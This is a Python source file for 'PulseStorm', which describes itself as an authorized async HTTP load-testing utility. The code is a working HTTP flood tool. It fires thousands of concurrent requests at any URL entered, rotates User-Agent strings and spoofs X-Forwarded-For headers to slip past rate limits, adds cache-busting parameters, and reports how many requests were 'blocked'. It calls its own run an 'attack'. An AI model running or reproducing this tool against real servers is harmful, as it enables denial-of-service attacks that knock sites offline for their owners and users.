"""
PulseStorm - Async HTTP Load Testing Tool

A high-performance asynchronous HTTP stress testing utility designed for 
authorized security testing, server load analysis, and educational purposes.

Author: brigtw696
GitHub: https://github.com/brigtw696
License: MIT
Version: 1.0.0

DISCLAIMER:
This tool is intended for authorized testing only. Users are responsible 
for complying with applicable laws and regulations. Unauthorized access 
to computer systems is illegal.
"""

import aiohttp
import asyncio
import time
import random
import sys
from urllib.parse import urljoin


def print_banner():
    banner = """
 @@@@@@@  @@@@@@@  @@@  @@@@@@@  @@@  @@@ @@@@@@@   @@@@@   @@@@@@    @@@@@ 
 @@!  @@@ @@!  @@@ @@! !@@       @@!  @@@   @@!   @@!@     @@!  @@@ @@!@    
 @!@!@!@  @!@!!@!  !!@ !@! @!@!@ @!@!@!@!   @!!   @!@!@!@   @!@@!@! @!@!@!@ 
 !!:  !!! !!: :!!  !!: :!!   !!: !!:  !!!   !!:   !!:  !!!      !!: !!:  !!!
 :: : ::   :   : : :    :: :: :   :   : :    :     : : ::   : :::    : : :: 
                                                                            
                                                                        
  ASYNC HTTP LOAD TESTING UTILITY | Author: brigt696  https://github.com/bright696
    """
    print(banner)
    print("⚠️  WARNING: For authorized testing only. Use at your own risk.\n")


class PulseStorm:
    def __init__(self, target_url, concurrency=500):
        self.target_url = target_url.strip()
        self.concurrency = concurrency
        self.stats = {
            'success': 0, 
            'blocked': 0, 
            'error': 0, 
            'timeout': 0
        }
        self.lock = asyncio.Lock()
        self.start_time = None
        
        self.endpoints = [
            '/',
            f'/?_={random.randint(100000, 999999)}',
            f'/ping?ts={int(time.time())}',
            '/api/status',
            '/test',
        ]

    async def flood_worker(self, session, url, semaphore, worker_id):
        async with semaphore:
            try:
                async with session.get(
                    url,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=5),
                    headers={
                        'User-Agent': self._get_random_ua(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'X-Forwarded-For': f'192.168.{random.randint(1,255)}.{random.randint(1,255)}'
                    }
                ) as response:
                    status = response.status
                    
                    async with self.lock:
                        if status == 200:
                            self.stats['success'] += 1
                        elif status in [429, 403, 503, 508, 502, 401]:
                            self.stats['blocked'] += 1
                        else:
                            self.stats['error'] += 1
                            
            except asyncio.TimeoutError:
                async with self.lock:
                    self.stats['timeout'] += 1
            except aiohttp.ClientConnectorError:
                async with self.lock:
                    self.stats['error'] += 1
            except Exception:
                async with self.lock:
                    self.stats['error'] += 1

    def _get_random_ua(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
        ]
        return random.choice(user_agents)

    async def stats_monitor(self):
        while True:
            await asyncio.sleep(2)
            elapsed = time.time() - self.start_time if self.start_time else 0
            total = sum(self.stats.values())
            
            if total > 0:
                rps = total / elapsed if elapsed > 0 else 0
                print(f"\r[PulseStorm] Success: {self.stats['success']} | "
                      f"Blocked: {self.stats['blocked']} | "
                      f"Timeout: {self.stats['timeout']} | "
                      f"Failed: {self.stats['error']} | "
                      f"RPS: {rps:.1f}", end="", flush=True)

    async def execute(self, duration=60):
        print(f"\n[+] Target: {self.target_url}")
        print(f"[+] Concurrency: {self.concurrency}")
        print(f"[+] Duration: {duration} seconds")
        print(f"[+] Mode: AsyncIO HTTP Flood\n")
        
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            ttl_dns_cache=300,
            use_dns_cache=True,
            enable_cleanup_closed=True,
            force_close=False
        )
        
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        ) as session:
            
            semaphore = asyncio.Semaphore(self.concurrency)
            self.start_time = time.time()
            end_time = self.start_time + duration
            
            monitor_task = asyncio.create_task(self.stats_monitor())
            tasks = []
            
            try:
                while time.time() < end_time:
                    endpoint = random.choice(self.endpoints)
                    url = urljoin(self.target_url, endpoint)
                    
                    task = asyncio.create_task(
                        self.flood_worker(session, url, semaphore, len(tasks))
                    )
                    tasks.append(task)
                    
                    if len(tasks) >= 100:
                        done, pending = await asyncio.wait(
                            tasks,
                            timeout=0.1,
                            return_when=asyncio.FIRST_COMPLETED
                        )
                        tasks = list(pending)
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    
            except KeyboardInterrupt:
                print("\n\n[!] Attack interrupted by user")
            finally:
                monitor_task.cancel()
                try:
                    await monitor_task
                except asyncio.CancelledError:
                    pass
            
            total_requests = sum(self.stats.values())
            duration_actual = time.time() - self.start_time
            
            print(f"\n\n{'='*50}")
            print(f"FINAL REPORT")
            print(f"{'='*50}")
            print(f"Target:        {self.target_url}")
            print(f"Duration:      {duration_actual:.1f}s")
            print(f"Total Req:     {total_requests}")
            print(f"Successful:    {self.stats['success']} ({self.stats['success']/total_requests*100:.1f}%)")
            print(f"Blocked:       {self.stats['blocked']} ({self.stats['blocked']/total_requests*100:.1f}%)")
            print(f"Timeouts:      {self.stats['timeout']}")
            print(f"Errors:        {self.stats['error']}")
            print(f"Avg RPS:       {total_requests/duration_actual:.1f}")
            print(f"{'='*50}")


def get_target():
    print("Enter target details (must include http:// or https://)")
    
    while True:
        url = input("\nTarget URL: ").strip()
        
        if not url:
            print("[!] Error: URL cannot be empty")
            continue
            
        if not (url.startswith('http://') or url.startswith('https://')):
            print("[!] Error: URL must start with http:// or https://")
            continue
            
        if not url.endswith('/'):
            url += '/'
            
        return url


def select_concurrency():
    print("\n=== CONCURRENCY LEVEL ===")
    print("1. LOW       (50)    - Gentle testing")
    print("2. MEDIUM    (200)   - Standard load")
    print("3. HIGH      (500)   - Aggressive")
    print("4. EXTREME   (1000)  - Maximum power")
    print("5. CUSTOM    (Manual input)")
    
    choice = input("\nSelect (1-5): ").strip()
    
    levels = {
        '1': 50,
        '2': 200,
        '3': 500,
        '4': 1000,
        '5': None
    }
    
    if choice == '5':
        try:
            val = int(input("Enter concurrency (10-5000): "))
            return max(10, min(val, 5000))
        except ValueError:
            print("[!] Invalid number, using default 500")
            return 500
    elif choice in levels:
        return levels[choice]
    else:
        print("[!] Invalid choice, using default 500")
        return 500


def main():
    print_banner()
    
    try:
        target = get_target()
        concurrency = select_concurrency()
        
        duration_input = input("Duration in seconds [default 300]: ").strip()
        duration = int(duration_input) if duration_input.isdigit() else 300
        
        if concurrency > 1000:
            confirm = input(f"WARNING: {concurrency} concurrency may impact system stability. Continue? (yes/no): ")
            if confirm.lower() != 'yes':
                print("Aborted.")
                return
        
        print(f"\n[*] Initializing PulseStorm...")
        print(f"[*] Press CTRL+C to stop\n")
        
        storm = PulseStorm(target, concurrency)
        asyncio.run(storm.execute(duration=duration))
        
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[ERROR] {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
